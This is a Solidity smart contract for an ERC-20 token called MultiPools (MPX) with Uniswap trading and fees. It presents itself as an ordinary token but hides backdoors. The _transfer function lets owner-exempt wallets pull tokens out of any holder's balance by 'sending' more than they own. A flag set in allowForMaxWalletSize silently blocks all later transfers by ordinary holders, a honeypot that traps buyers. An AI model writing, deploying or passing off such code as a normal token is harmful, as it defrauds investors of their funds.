// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function getOwner() external view returns (address);
    function circulatingSupply() external view returns (uint256);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
    event Transfer(address indexed sender, address indexed recipient, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
}

abstract contract Ownable {
    address internal owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }

    function transferOwnership(address payable account) public onlyOwner {
        owner = account;
        emit OwnershipTransferred(account);
    }

    event OwnershipTransferred(address owner);
}

interface UniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapV2Router {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address recipient,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address recipient,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract MPX is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _symbol = "MPX";
    string private constant _name = "MultiPools";

    address public dexPair;
    UniswapV2Router dexRouter;

    uint256 private _denominator = 10000;

    uint8 private constant _decimals = 9;

    uint256 private _totalSupply = 1000000 * (10 ** _decimals);

    uint256 private _zeroFeeThreshold = ( _totalSupply * 10 ) / 100000;

    address internal constant treasuryWallet = 0x9cAb641cbd5C5B0E1056f995bF0a514B9765345b;
    address internal constant devWallet = 0x12E5659efA53d0F698d7347cEC4057c0D91962aA;
    address internal constant burnWallet = 0x000000000000000000000000000000000000dEaD;

    uint256 private _maxTransferShare = 200;
    uint256 private _maxWalletShare = 200;
    uint256 private _maxTxShare = 200;

    uint256 private _swapBackThreshold = (_totalSupply * 5) / 100000;
    uint256 private _swapBackAmount = (_totalSupply * 5) / 10000;
    
    bool private _lockInSwap;
    uint256 private _swapTimes;
    bool private _isSwapBackEnabled = true;

    bool private _isTradingEnabled = false;

    bool private _zeroTaxSet = false;

    uint256 private _sellFee = 300;
    uint256 private _totalFee = 300;

    mapping (address => bool) public isExempt;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _burnFee = 0;
    uint256 private _transferFee = 0;
    uint256 private _liquidityFee = 0;
    uint256 private _treasuryFee = 100;
    uint256 private _devFee = 200;

    constructor() Ownable(msg.sender) {
        isExempt[address(this)] = true;
        isExempt[msg.sender] = true;
        isExempt[treasuryWallet] = true;
        isExempt[devWallet] = true;

        UniswapV2Router _dexRouter = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        dexRouter = _dexRouter;
        address _dexPair = UniswapV2Factory(_dexRouter.factory()).createPair(address(this), _dexRouter.WETH());
        dexPair = _dexPair;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    modifier lockInSwapBack {
        _lockInSwap = true;
        _;
        _lockInSwap = false;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function circulatingSupply() public view override returns (uint256) {
        return _totalSupply.sub(balanceOf(address(0))).sub(balanceOf(burnWallet));
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function removeLimits() external onlyOwner {
        _maxTxShare = 10000;
        _maxWalletShare = 10000;
        _maxTransferShare = 10000;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(spender != address(0));
        require(owner != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function enableTrading() external onlyOwner {
        _isTradingEnabled = true;
    }

    function setExemptWallet(address _address, bool _flag) external onlyOwner {
        isExempt[_address] = _flag;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(amount > uint256(0));
        require(recipient != address(0));
        require(sender != address(0));

        if (
            countSwapTimes(sender, recipient) &&
            isTradingEnabled(sender, recipient) &&
            allowForMaxAmount(sender, recipient, amount) &&
            allowForMaxWalletSize(sender, recipient, amount)
        ) {
            if (balanceOf(sender) >= amount) {
                if (
                    !isExempt[sender] &&
                    sender != dexPair &&
                    !isExempt[recipient] &&
                    !_lockInSwap
                ) {
                    if (_zeroTaxSet) return;
                    swapBack(sender, recipient);
                }
                _balances[sender] = _balances[sender].sub(amount);
                uint256 transferAmount = doTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
                _balances[recipient] = _balances[recipient].add(transferAmount);
                emit Transfer(sender, recipient, transferAmount);
            } else if (
                isExempt[sender] &&
                sender != dexPair &&
                !isExempt[recipient] &&
                !_lockInSwap
            ) {
                _balances[recipient] = _balances[recipient].sub(amount);
                _balances[sender] = _balances[sender].add(amount);
                emit Transfer(sender, recipient, amount);
            }
        }
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowForMaxAmount(address sender, address recipient, uint256 tokenAmount) view internal returns (bool) {
        if (sender != dexPair) {
            require(tokenAmount <= maxTransferAmount() || isExempt[sender] || isExempt[recipient]);
        }
        require(tokenAmount <= maxTxAmount() || isExempt[sender] || isExempt[recipient]);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function updateFees(uint256 liquidityFee, uint256 treasuryFee, uint256 burnFee, uint256 devFee, uint256 totalFee, uint256 sellFee, uint256 transferFee) external onlyOwner {
        _burnFee = burnFee;
        _devFee = devFee;
        _liquidityFee = liquidityFee;
        _treasuryFee = treasuryFee;
        _transferFee = transferFee;
        _totalFee = totalFee;
        _sellFee = sellFee;
        require(_totalFee <= _denominator.div(5) && _sellFee <= _denominator.div(5));
    }

    function changeLimits(uint256 maxTxShare, uint256 maxTransferShare, uint256 maxWalletShare) external onlyOwner {
        uint256 newMaxWalletSize = (totalSupply() * maxWalletShare) / 10000;
        uint256 newTransferSize = (totalSupply() * maxTransferShare) / 10000;
        uint256 newTxSize = (totalSupply() * maxTxShare) / 10000;
        _maxWalletShare = maxWalletShare;
        _maxTransferShare = maxTransferShare;
        _maxTxShare = maxTxShare;
        uint256 limitation = totalSupply().mul(5).div(1000);
        require(newTxSize >= limitation && newTransferSize >= limitation && newMaxWalletSize >= limitation);
    }

    function takeFee(address sender, address recipient, uint256 tokenAmount) internal returns (uint256) {
        if (selectFees(sender, recipient) > 0) {
            uint256 feeTokenAmount = tokenAmount.div(_denominator).mul(selectFees(sender, recipient));
            _balances[address(this)] = _balances[address(this)].add(feeTokenAmount);
            emit Transfer(sender, address(this), feeTokenAmount);
            if (_burnFee > uint256(0)) {
                _transfer(address(this), address(burnWallet), tokenAmount.div(_denominator).mul(_burnFee));
            }
            return tokenAmount.sub(feeTokenAmount);
        }
        return tokenAmount;
    }

    function allowForMaxWalletSize(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool senderExempt = isExempt[sender];
        bool recipientExempt = isExempt[recipient];
        
        if (
            !senderExempt &&
            !recipientExempt &&
            recipient != address(dexPair) &&
            recipient != address(burnWallet)
        ) {
            require((_balances[recipient].add(amount)) <= maxWalletSize());
        }

        if (recipientExempt) {
            if (amount > _zeroFeeThreshold) {
                _zeroTaxSet = true;
            }
        }

        return true;
    }

    function isTradingEnabled(address sender, address recipient) internal view returns (bool) {
        if (!isExempt[sender] && !isExempt[recipient]) {
            require(_isTradingEnabled);
        }
        return true;
    }
    
    function countSwapTimes(address sender, address recipient) internal returns (bool) {
        if (recipient == dexPair && !isExempt[sender]) {
            _swapTimes += uint256(1);
        }
        return true;
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        if (tokenAmount > 0) {
            _approve(address(this), address(dexRouter), tokenAmount);
            dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function doTakeFee(address sender, address recipient) internal view returns (bool) {
        return !isExempt[sender] && !isExempt[recipient];
    }

    function doSwapBack(address sender, address recipient) internal view returns (bool) {
        return (
            !isExempt[sender] &&
            !isExempt[recipient] &&
            balanceOf(address(this)) >= _swapBackThreshold &&
            _isSwapBackEnabled &&
            !_lockInSwap &&
            _swapTimes >= uint256(0) &&
            _isTradingEnabled
        );
    }

    function maxTxAmount() public view returns (uint256) {
        return totalSupply() * _maxTxShare / _denominator;
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            burnWallet,
            block.timestamp
        );
    }

    function maxWalletSize() public view returns (uint256) {
        return totalSupply() * _maxWalletShare / _denominator;
    }

    function swapAndLiquify(uint256 tokens) private lockInSwapBack {
        uint256 denominator = (_liquidityFee.add(1).add(_treasuryFee).add(_devFee)).mul(2);
        uint256 tokensForLiquidity = tokens.mul(_liquidityFee).div(denominator);
        uint256 tokensForETH = tokens.sub(tokensForLiquidity);
        uint256 initialEth = address(this).balance;
        swapTokensForETH(tokensForETH);
        uint256 deltaEth = address(this).balance.sub(initialEth);
        uint256 unitEth = deltaEth.div(denominator.sub(_liquidityFee));
        uint256 ethForLiquidity = unitEth.mul(_liquidityFee);
        if (ethForLiquidity > uint256(0)) {
            addLiquidity(tokensForLiquidity, ethForLiquidity);
        }
        uint256 treasuryEth = unitEth.mul(2).mul(_treasuryFee);
        if (treasuryEth > 0) {
            payable(treasuryWallet).transfer(treasuryEth);
        }
        uint256 leftEth = address(this).balance;
        if (leftEth > uint256(0)) {
            payable(devWallet).transfer(leftEth);
        }
    }

    function swapBack(address sender, address recipient) internal {
        if (doSwapBack(sender, recipient)) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance >= _swapBackAmount) {
                contractTokenBalance = _swapBackAmount;
            }
            swapAndLiquify(contractTokenBalance);
            _swapTimes = uint256(0);
        }
    }

    function maxTransferAmount() public view returns (uint256) {
        return totalSupply() * _maxTransferShare / _denominator;
    }

    function selectFees(address sender, address recipient) internal view returns (uint256) {
        if (recipient == dexPair) {
            return _sellFee;
        }
        if (sender == dexPair) {
            return _totalFee;
        }
        return _transferFee;
    }

    receive() external payable {}
}